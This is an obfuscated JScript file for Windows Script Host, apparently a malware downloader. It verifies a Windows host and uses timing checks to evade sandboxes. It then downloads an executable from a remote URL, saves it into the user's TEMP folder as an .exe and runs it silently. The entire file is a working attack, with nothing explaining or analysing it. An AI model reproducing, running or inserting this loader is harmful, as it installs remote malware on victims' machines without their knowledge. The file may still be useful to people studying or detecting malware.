var _JU = false;
var _K = "CreateObject";
var _D2 = function _SA() {return WScript[_K]("WScript"+".Shell");}(), _Z1 = 11;
var _F = "MSXML2.XMLHTTP";
var _Z0 = 2123213;
var _B = 0;
function _PX(_J){_D2["Run"](_J, _B, _B);};
function _DR(){return _F + "";};
function _D(_AL, _K0){_B = _B * 1; return _AL - _K0;};
function _PS(){return _K;};
/*@cc_on
  @if (@_win32 || @_win64)
    _JU = true;
  @end
@*/
if (_JU)
{
var _QQ = "";
function _UG(){return 22;};
var _EO = 0; var _HO = 0;
function _C()
{
var _G = new this["Date"]();
var _D1 = _G["getUTCMilliseconds"]();
WScript["Sleep"](_UG());
var _G = new this["Date"]();
var _Y = _G["getUTCMilliseconds"]();
WScript["Sleep"](_UG());
var _G = new this["Date"]();
var _P0 = _G["getUTCMilliseconds"]();
var _EO = "_GZ";
_EO = _D(_Y, _D1);
var _HO = "_V";
_HO = _D(_P0, _Y);
_QQ = "open";
return _D(_EO, _HO);
}
var _J0 = false;
var _N = false;
for (var _H0 = _B; _H0 < _UG() * 1; _H0++){if (_C() != _B){
_J0 = true; 
_HO = "31" + 11 * _EO + _HO; 
_N = true; 
break;
}}
function _R() {return ((_J0 == true) && (_J0 == _N)) ? 1 : _B;};
if (_J0 && _R() && _N){
function _P() {return _D2["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "Ow5vNwRV.ex" + "e";};
 _TE = _DR();
 _NC = WScript[_K](_TE);
 var _XY = 1;
 while (_XY){
try {
	if (_XY == 1)
	{
		_NC[_QQ]("GET", "http://bonares.pl/x9isa", false);
		_NC["send"]();
		_GK = "Sleep";
	}
	WScript[_GK](_UG() + 120); 
	if (_NC["readystate"] < 2 * 2) continue;
	_XY = _B;
	function _Z(_D0) {var _E = (1, 2, 3, 4, 5, _D0); return _E;};
	_EX = WScript[_PS()]("ADODB.Stream");
	_TE = _EX;
	_TE[_QQ]();
	_TE["type"] = _Z(1);
	_TE["write"](_NC["ResponseBody"]);
	_EX["position"] = _Z(_B);
	_TE["Save" + "ToFile"](_P(), 2);
	_EX["cl"+"ose"]();
	_H = _P();
	_PX(_H);
} catch(_VT){};
}
}
}

